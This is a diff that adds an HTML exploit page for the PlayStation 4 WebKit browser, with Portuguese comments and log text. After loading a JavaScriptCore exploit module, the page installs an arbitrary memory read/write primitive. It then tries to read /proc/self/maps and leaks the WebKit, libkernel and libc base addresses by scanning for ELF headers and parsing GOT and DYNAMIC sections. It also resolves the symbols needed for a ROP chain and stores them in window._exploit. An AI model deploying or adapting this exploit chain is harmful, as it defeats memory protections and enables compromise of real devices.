@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PS4 WebKit Exploit</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            background: #0a0a0f;
+            color: #e0e0e0;
+            font-family: 'Courier New', monospace;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        h1 {
+            font-size: 18px;
+            color: #00c8ff;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            margin-bottom: 6px;
+            text-align: center;
+        }
+
+        #fw-label {
+            font-size: 11px;
+            color: #666;
+            margin-bottom: 18px;
+            text-align: center;
+            letter-spacing: 2px;
+        }
+
+        /* ---- status bar ---- */
+        #status-bar {
+            width: 100%;
+            max-width: 700px;
+            background: #111118;
+            border: 1px solid #1e1e2e;
+            border-radius: 6px;
+            padding: 12px 16px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        #status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #444;
+            flex-shrink: 0;
+            transition: background 0.3s;
+        }
+        #status-dot.running  { background: #f0a500; animation: pulse 1s infinite; }
+        #status-dot.ok       { background: #00c853; }
+        #status-dot.error    { background: #ff3d3d; }
+
+        @keyframes pulse {
+            0%,100% { opacity: 1; }
+            50%      { opacity: 0.3; }
+        }
+
+        #status-text {
+            font-size: 13px;
+            color: #ccc;
+            flex: 1;
+        }
+
+        /* ---- attempt counter ---- */
+        #attempt-bar {
+            width: 100%;
+            max-width: 700px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            color: #444;
+            margin-bottom: 12px;
+            padding: 0 2px;
+        }
+
+        /* ---- console ---- */
+        #console {
+            width: 100%;
+            max-width: 700px;
+            height: 400px;
+            background: #06060c;
+            border: 1px solid #1a1a2e;
+            border-radius: 6px;
+            overflow-y: auto;
+            padding: 10px 12px;
+            font-size: 12px;
+            line-height: 1.6;
+            margin-bottom: 12px;
+        }
+
+        .log-line { padding: 1px 0; word-break: break-all; }
+        .log-info    { color: #7ec8e3; }
+        .log-ok      { color: #00c853; font-weight: bold; }
+        .log-warn    { color: #f0a500; }
+        .log-error   { color: #ff5252; font-weight: bold; }
+        .log-dim     { color: #444; }
+        .log-addr    { color: #bd93f9; }
+        .log-section {
+            color: #00c8ff;
+            border-top: 1px solid #1a1a2e;
+            margin-top: 6px;
+            padding-top: 6px;
+            letter-spacing: 1px;
+        }
+
+        /* ---- bases grid ---- */
+        #bases-grid {
+            width: 100%;
+            max-width: 700px;
+            display: none;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+        #bases-grid.visible { display: grid; }
+
+        .base-card {
+            background: #0d0d1a;
+            border: 1px solid #1e1e3a;
+            border-radius: 6px;
+            padding: 10px 14px;
+        }
+        .base-card .label {
+            font-size: 10px;
+            color: #555;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 4px;
+        }
+        .base-card .value {
+            font-size: 13px;
+            color: #bd93f9;
+            word-break: break-all;
+        }
+        .base-card .value.na { color: #333; }
+
+        /* ---- libs list ---- */
+        #libs-list {
+            width: 100%;
+            max-width: 700px;
+            display: none;
+            flex-direction: column;
+            gap: 6px;
+            margin-bottom: 12px;
+        }
+        #libs-list.visible { display: flex; }
+
+        .lib-row {
+            background: #0d0d1a;
+            border: 1px solid #1a1a2e;
+            border-radius: 4px;
+            padding: 8px 12px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+        }
+        .lib-row .lib-name { color: #8be9fd; }
+        .lib-row .lib-base { color: #bd93f9; }
+    </style>
+</head>
+<body>
+
+<h1>PS4 WebKit Exploit</h1>
+<div id="fw-label">aguardando firmware...</div>
+
+<div id="status-bar">
+    <div id="status-dot"></div>
+    <div id="status-text">Inicializando...</div>
+</div>
+
+<div id="attempt-bar">
+    <span id="attempt-text">tentativa: —</span>
+    <span id="stage-text">estágio: —</span>
+</div>
+
+<div id="console"></div>
+
+<div id="bases-grid">
+    <div class="base-card">
+        <div class="label">WebKit Base</div>
+        <div class="value na" id="card-webkit">—</div>
+    </div>
+    <div class="base-card">
+        <div class="label">libkernel Base</div>
+        <div class="value na" id="card-kernel">—</div>
+    </div>
+    <div class="base-card">
+        <div class="label">libc Base</div>
+        <div class="value na" id="card-libc">—</div>
+    </div>
+    <div class="base-card">
+        <div class="label">__ps5NativeCtor</div>
+        <div class="value na" id="card-ctor">—</div>
+    </div>
+</div>
+
+<div id="libs-list"></div>
+
+<!-- ============================================================
+     ES MODULE ENTRY POINT
+     mem.js já importa core.js?v=10 e int64.js internamente.
+     Usamos a mesma query string para garantir o mesmo módulo.
+     ============================================================ -->
+<script type="module">
+
+// --- imports dos módulos do slopkit ------------------------------------------
+import { int64 }        from './resources/int64.js';
+import { startCore }    from './resources/core.js';
+import { installWindowP } from './resources/mem.js';
+
+// int64 precisa estar global pois mem.js e main.js a referenciam via globalThis
+globalThis.int64 = int64;
+
+// --- UI helpers --------------------------------------------------------------
+const $console    = document.getElementById('console');
+const $dot        = document.getElementById('status-dot');
+const $statusText = document.getElementById('status-text');
+const $attemptTxt = document.getElementById('attempt-text');
+const $stageTxt   = document.getElementById('stage-text');
+const $fwLabel    = document.getElementById('fw-label');
+const $basesGrid  = document.getElementById('bases-grid');
+const $libsList   = document.getElementById('libs-list');
+
+function log(msg, cls = 'log-info') {
+    const el = document.createElement('div');
+    el.className = 'log-line ' + cls;
+    el.textContent = msg;
+    $console.appendChild(el);
+    $console.scrollTop = $console.scrollHeight;
+}
+
+function setStatus(msg, state = 'running') {
+    $statusText.textContent = msg;
+    $dot.className = state;
+}
+
+function setCard(id, value) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.textContent = value;
+    el.classList.remove('na');
+}
+
+function addLibRow(name, base) {
+    const row = document.createElement('div');
+    row.className = 'lib-row';
+    row.innerHTML = `<span class="lib-name">${name}</span><span class="lib-base">0x${base}</span>`;
+    $libsList.appendChild(row);
+    $libsList.classList.add('visible');
+}
+
+// --- detecta firmware --------------------------------------------------------
+const ua = navigator.userAgent;
+let fwStr = '';
+const fwMatch = /PlayStation 4\/(\d+\.\d+)/.exec(ua)
+             || /PlayStation 5\/(\d+\.\d+)/.exec(ua);
+if (fwMatch) fwStr = fwMatch[1];
+$fwLabel.textContent = fwStr
+    ? `PlayStation — firmware ${fwStr}`
+    : `UA: ${ua.slice(0, 60)}`;
+
+// --- utilitários de memória ---------------------------------------------------
+function readStr(p, addr, maxLen = 256) {
+    let s = '';
+    for (let i = 0; i < maxLen; i++) {
+        const c = p.read1(addr.add32(i));
+        if (c === 0) break;
+        s += String.fromCharCode(c);
+    }
+    return s;
+}
+
+// --- /proc/self/maps (tenta, não é garantido) --------------------------------
+async function tryProcMaps() {
+    const urls = [
+        'file:///proc/self/maps',
+        'file:///proc/self/smaps'
+    ];
+    for (const url of urls) {
+        try {
+            const r = await fetch(url);
+            const txt = await r.text();
+            if (txt && txt.length > 50) {
+                log('[+] /proc/self/maps acessível!', 'log-ok');
+                log(txt.slice(0, 4000), 'log-dim');
+                return txt;
+            }
+        } catch (_) { /* silencioso */ }
+    }
+    log('[-] /proc/self/maps bloqueado (sandbox ativo)', 'log-warn');
+    return null;
+}
+
+// --- pegar ponteiro confiável dentro do WebKit -------------------------------
+function getWebKitPointer(p) {
+    // core.js captura isso durante o exploit (linha ~985)
+    const ctor = globalThis.__ps5NativeCtor;
+    if (typeof ctor === 'number' && ctor > 0x100000000) {
+        const hi = Math.floor(ctor / 0x100000000);
+        const lo = ctor - hi * 0x100000000;
+        const ptr = new int64(lo >>> 0, hi >>> 0);
+        log('[+] __ps5NativeCtor: 0x' + ptr.toString(), 'log-addr');
+        setCard('card-ctor', '0x' + ptr.toString());
+        return ptr;
+    }
+    // fallback: vtable de elemento DOM
+    const el = document.createElement('textarea');
+    const cell   = p.leakval(el);
+    const cppObj = p.read8(cell.add32(0x18));
+    const vtable = p.read8(cppObj);
+    const entry  = p.read8(vtable);
+    log('[+] vtable[0]: 0x' + entry.toString(), 'log-addr');
+    return entry;
+}
+
+// --- ELF scan: anda para trás até achar \x7fELF -----------------------------
+function findElfBase(p, ptrInside, label) {
+    // PS4 usa páginas de 16 KB (amd64 large page variant)
+    const PAGE     = 0x4000;
+    const MAX_BACK = 0x8000;   // até 512 MB
+
+    let lo   = (ptrInside.low) & ~(PAGE - 1);
+    let base = new int64(lo >>> 0, ptrInside.hi);
+
+    for (let i = 0; i < MAX_BACK; i++) {
+        if (base.hi === 0 && base.low < PAGE) break;
+
+        let magic;
+        try { magic = p.read4(base); }
+        catch (_) { base = base.sub32(PAGE); continue; }
+
+        // 0x7F 'E' 'L' 'F' em little-endian = 0x464C457F
+        if (magic === 0x464C457F) {
+            let cls, enc;
+            try {
+                cls = p.read1(base.add32(4));
+                enc = p.read1(base.add32(5));
+            } catch (_) { base = base.sub32(PAGE); continue; }
+
+            if (cls === 2 && enc === 1) {
+                log(`[+] ${label} base: 0x${base.toString()} (${i} páginas atrás)`, 'log-ok');
+                return base;
+            }
+        }
+        base = base.sub32(PAGE);
+    }
+    log(`[-] Não encontrei base ELF para: ${label}`, 'log-warn');
+    return null;
+}
+
+// --- parse da seção DYNAMIC em memória ---------------------------------------
+function parseDynamic(p, elfBase) {
+    const PT_DYNAMIC = 2;
+
+    let e_phoff, e_phentsize, e_phnum;
+    try {
+        e_phoff     = p.read8(elfBase.add32(0x20)).low;
+        e_phentsize = p.read2(elfBase.add32(0x36));
+        e_phnum     = p.read2(elfBase.add32(0x38));
+    } catch(_) { return null; }
+
+    let dynOff = null, dynSz = 0;
+
+    for (let i = 0; i < e_phnum; i++) {
+        try {
+            const ph = elfBase.add32(e_phoff + i * e_phentsize);
+            if (p.read4(ph) === PT_DYNAMIC) {
+                dynOff = p.read8(ph.add32(0x08)).low;   // p_offset
+                dynSz  = p.read8(ph.add32(0x20)).low;   // p_filesz
+                break;
+            }
+        } catch(_) {}
+    }
+    if (dynOff === null) return null;
+
+    const dynAddr = elfBase.add32(dynOff);
+
+    const DT_NULL    = 0;
+    const DT_SONAME  = 14;
+    const DT_STRTAB  = 5;
+    const DT_SYMTAB  = 6;
+    const DT_SYMENT  = 11;
+    const DT_PLTGOT  = 3;
+    const DT_JMPREL  = 23;
+    const DT_PLTRELSZ= 2;
+
+    const r = {
+        strtab: null, symtab: null, syment: 0x18,
+        pltgot: null, jmprel: null, pltrelsz: 0,
+        sonameOff: 0, soname: ''
+    };
+
+    const entries = Math.min(Math.floor(dynSz / 0x10), 512);
+    for (let i = 0; i < entries; i++) {
+        try {
+            const e   = dynAddr.add32(i * 0x10);
+            const tag = p.read8(e).low;
+            const val = p.read8(e.add32(0x8));
+
+            if (tag === DT_NULL)      break;
+            if (tag === DT_STRTAB)    r.strtab    = val;
+            if (tag === DT_SYMTAB)    r.symtab    = val;
+            if (tag === DT_SYMENT)    r.syment    = val.low;
+            if (tag === DT_PLTGOT)    r.pltgot    = val;
+            if (tag === DT_JMPREL)    r.jmprel    = val;
+            if (tag === DT_PLTRELSZ)  r.pltrelsz  = val.low;
+            if (tag === DT_SONAME)    r.sonameOff = val.low;
+        } catch(_) {}
+    }
+
+    if (r.strtab && r.sonameOff) {
+        try { r.soname = readStr(p, r.strtab.add32(r.sonameOff), 64); }
+        catch(_) { r.soname = '<NID ou ilegível>'; }
+    }
+
+    return r;
+}
+
+// --- busca símbolo por nome exato --------------------------------------------
+function findSymbol(p, elfBase, dyn, name) {
+    if (!dyn || !dyn.symtab || !dyn.strtab) return null;
+    const MAX_SYMS = 4096;
+    for (let i = 0; i < MAX_SYMS; i++) {
+        try {
+            const sym     = dyn.symtab.add32(i * dyn.syment);
+            const st_name = p.read4(sym);
+            if (st_name === 0) continue;
+            const symName = readStr(p, dyn.strtab.add32(st_name), 64);
+            if (symName === name) {
+                const st_value = p.read8(sym.add32(0x8));
+                // para lib compartilhada: st_value é offset relativo
+                return elfBase.add32(st_value.low);
+            }
+        } catch(_) {}
+    }
+    return null;
+}
+
+// --- descobre libs importadas pela GOT ---------------------------------------
+function discoverImports(p, dyn, ownerLabel) {
+    if (!dyn || !dyn.pltgot) return [];
+
+    const numSlots = dyn.pltrelsz ? Math.floor(dyn.pltrelsz / 0x18) + 3 : 256;
+    const seen     = new Map();
+
+    for (let i = 3; i < numSlots; i++) {
+        let slot;
+        try { slot = p.read8(dyn.pltgot.add32(i * 8)); }
+        catch(_) { continue; }
+
+        // filtra: endereço user-space 48-bit, alinhado a 4 bytes
+        if (slot.hi === 0 || slot.hi > 0xFFFF) continue;
+        if ((slot.low & 3) !== 0) continue;
+
+        const libBase = findElfBase(p, slot, `got[${i}]@${ownerLabel}`);
+        if (!libBase) continue;
+
+        const key = libBase.toString();
+        if (!seen.has(key)) {
+            const libDyn  = parseDynamic(p, libBase);
+            const soname  = libDyn?.soname || '<desconhecido>';
+            seen.set(key, { base: libBase, dyn: libDyn, soname });
+            log(`  ? importa: 0x${key}  ${soname}`, 'log-addr');
+            addLibRow(soname, key);
+        }
+    }
+
+    return [...seen.values()];
+}
+
+// --- FUNÇÃO PRINCIPAL: vaza todas as bases -----------------------------------
+async function leakAllBases(p) {
+    log('', '');
+    log('-- FASE 1: /proc/self/maps --------------------', 'log-section');
+    await tryProcMaps();
+
+    log('', '');
+    log('-- FASE 2: Ponteiro inicial no WebKit ---------', 'log-section');
+    const wkPtr = getWebKitPointer(p);
+
+    log('', '');
+    log('-- FASE 3: ELF scan — WebKit ------------------', 'log-section');
+    const webkitBase = findElfBase(p, wkPtr, 'WebKit');
+    if (!webkitBase) {
+        setStatus('Falha: WebKit base não encontrada', 'error');
+        return null;
+    }
+
+    setCard('card-webkit', '0x' + webkitBase.toString());
+    $basesGrid.classList.add('visible');
+
+    log('', '');
+    log('-- FASE 4: parse DYNAMIC do WebKit ------------', 'log-section');
+    const wkDyn = parseDynamic(p, webkitBase);
+    if (wkDyn) {
+        log(`  SONAME: ${wkDyn.soname || '<vazio>'}`, 'log-info');
+        log(`  strtab: 0x${wkDyn.strtab?.toString() || '?'}`, 'log-dim');
+        log(`  pltgot: 0x${wkDyn.pltgot?.toString() || '?'}`, 'log-dim');
+        log(`  pltrelsz: ${wkDyn.pltrelsz}`, 'log-dim');
+    } else {
+        log('  Falhou ao parsear DYNAMIC', 'log-warn');
+    }
+
+    log('', '');
+    log('-- FASE 5: Descobrindo libs importadas --------', 'log-section');
+    const imports = discoverImports(p, wkDyn, 'WebKit');
+
+    log('', '');
+    log(`  Total: ${imports.length} módulos encontrados`, 'log-info');
+
+    // -- identifica libkernel e libc --
+    let libkernelEntry = null, libcEntry = null;
+
+    for (const lib of imports) {
+        const s = lib.soname.toLowerCase();
+        if (!libkernelEntry && (s.includes('kernel') || s.includes('libkernel')))
+            libkernelEntry = lib;
+        if (!libcEntry && (s.includes('libc') || s.includes('libscelibcinternal')))
+            libcEntry = lib;
+    }
+
+    // -- se SONAME não for legível (NIDs), tenta heurística --
+    if (!libkernelEntry && imports.length > 0) {
+        log('  [!] SONAMEs parecem ser NIDs do PS4.', 'log-warn');
+        log('  Listando todas as bases (escolha manualmente):', 'log-warn');
+        imports.forEach((lib, idx) => {
+            log(`    [${idx}] 0x${lib.base.toString()}  ${lib.soname}`, 'log-dim');
+        });
+        // heurística: libkernel geralmente é a lib com menor endereço
+        const sorted = [...imports].sort((a, b) => {
+            const da = a.base.hi * 0x100000000 + a.base.low;
+            const db = b.base.hi * 0x100000000 + b.base.low;
+            return da - db;
+        });
+        libkernelEntry = sorted[0];
+        log(`  Assumindo libkernel = 0x${libkernelEntry.base.toString()} (menor base)`, 'log-warn');
+    }
+
+    if (libkernelEntry) {
+        setCard('card-kernel', '0x' + libkernelEntry.base.toString());
+        log(`[+] libkernel: 0x${libkernelEntry.base.toString()}`, 'log-ok');
+    }
+    if (libcEntry) {
+        setCard('card-libc', '0x' + libcEntry.base.toString());
+        log(`[+] libc:      0x${libcEntry.base.toString()}`, 'log-ok');
+    }
+
+    // -- busca símbolos necessários para ROP --
+    log('', '');
+    log('-- FASE 6: Resolução de símbolos --------------', 'log-section');
+
+    const NEEDED = ['setjmp', 'longjmp', 'memset', 'memcpy',
+                    'pthread_create', '__stack_chk_guard',
+                    'sceKernelGetProcParam'];
+    const symbols = {};
+
+    for (const sym of NEEDED) {
+        let found = false;
+        for (const lib of imports) {
+            if (!lib.dyn) continue;
+            const addr = findSymbol(p, lib.base, lib.dyn, sym);
+            if (addr) {
+                symbols[sym] = addr;
+                log(`  [+] ${sym.padEnd(28)} 0x${addr.toString()}`, 'log-ok');
+                found = true;
+                break;
+            }
+        }
+        if (!found)
+            log(`  [-] ${sym.padEnd(28)} não encontrado (NID ou ausente)`, 'log-dim');
+    }
+
+    // -- resultado final --
+    const result = {
+        webkitBase,
+        libkernelBase: libkernelEntry?.base || null,
+        libcBase:      libcEntry?.base      || null,
+        allLibs:       imports,
+        symbols
+    };
+
+    log('', '');
+    log('-- RESULTADO FINAL ----------------------------', 'log-section');
+    log(`webkitBase    = 0x${result.webkitBase.toString()}`, 'log-addr');
+    log(`libkernelBase = 0x${result.libkernelBase?.toString() || '?'}`, 'log-addr');
+    log(`libcBase      = 0x${result.libcBase?.toString() || '?'}`, 'log-addr');
+    log('', '');
+    log('? Bases expostas em window._exploit', 'log-ok');
+
+    globalThis._exploit = result;
+    return result;
+}
+
+// --- EVENTO do core.js -------------------------------------------------------
+function onCoreEvent(tag, detail, attempt) {
+    // atualiza contadores de tentativa / estágio na UI
+    if (attempt !== undefined)
+        $attemptTxt.textContent = `tentativa: ${attempt}`;
+    $stageTxt.textContent = `estágio: ${tag.toLowerCase()}`;
+
+    // filtra eventos muito verbosos para o console visual
+    const VERBOSE = ['PAIR-REPROVED','PAIR-IDENTITY-MAIN','PAIR-IDENTITY-WORKER',
+                     'PAIR-COMMIT','PAIR-MAIN-RECORD','PAIR-CELLS',
+                     'PAIR-WORKER-HEADER','PAIR-WIDENED','PAIR-RELEASE'];
+    if (VERBOSE.includes(tag)) {
+        log(`  ${tag}: ${detail}`, 'log-dim');
+        return;
+    }
+
+    const isOk  = tag.includes('UP') || tag.includes('OK') || tag.includes('SUCCESS');
+    const isErr = tag.includes('FAIL') || tag.includes('ERROR') || tag.includes('GIVE-UP');
+    const cls   = isOk ? 'log-ok' : isErr ? 'log-error' : 'log-info';
+
+    log(`[${tag}] ${detail}`, cls);
+}
+
+// --- BOOT --------------------------------------------------------------------
+(async () => {
+    log(`UA: ${ua}`, 'log-dim');
+    log(`Firmware detectado: ${fwStr || 'desconhecido'}`, 'log-info');
+    log('', '');
+
+    setStatus('Rodando exploit JSC (core.js)…', 'running');
+    log('-- EXPLOIT JSC (WebKit) ------------------------', 'log-section');
+
+    let carrier;
+    try {
+        carrier = await startCore({
+            onEvent: onCoreEvent,
+            attemptCeiling: 0   // 0 = sem limite de tentativas
+        });
+    } catch (err) {
+        setStatus('core.js falhou: ' + err.message, 'error');
+        log('[ERRO] ' + err.message, 'log-error');
+        return;
+    }
+
+    log('[+] core.js: exploit JSC concluído!', 'log-ok');
+    log('', '');
+    log('-- INSTALANDO PRIMITIVA R/W (mem.js) ----------', 'log-section');
+    setStatus('Instalando primitiva de memória…', 'running');
+
+    let p;
+    try {
+        p = installWindowP(carrier, {
+            promote: true,
+            onEvent: (tag, detail) => {
+                log(`  [mem/${tag}] ${detail}`, 'log-dim');
+            }
+        });
+    } catch (err) {
+        setStatus('mem.js falhou: ' + err.message, 'error');
+        log('[ERRO] ' + err.message, 'log-error');
+        return;
+    }
+
+    // window.p disponível globalmente
+    log('[+] R/W arbitrário: window.p instalado', 'log-ok');
+    log('', '');
+
+    setStatus('Vazando endereços base…', 'running');
+    log('-- LEAK DE BASES -------------------------------', 'log-section');
+
+    let bases;
+    try {
+        bases = await leakAllBases(p);
+    } catch (err) {
+        setStatus('leakAllBases falhou: ' + err.message, 'error');
+        log('[ERRO] ' + err.message, 'log-error');
+        return;
+    }
+
+    if (!bases) {
+        setStatus('Falha no leak de bases', 'error');
+        return;
+    }
+
+    setStatus('Bases vazadas com sucesso — próximo: ROP', 'ok');
+    log('', '');
+    log('Próximo passo: construir ROP chain com as bases acima.', 'log-info');
+    log('window._exploit contém todas as bases e símbolos.', 'log-dim');
+})();
+
+</script>
+</body>
+</html>
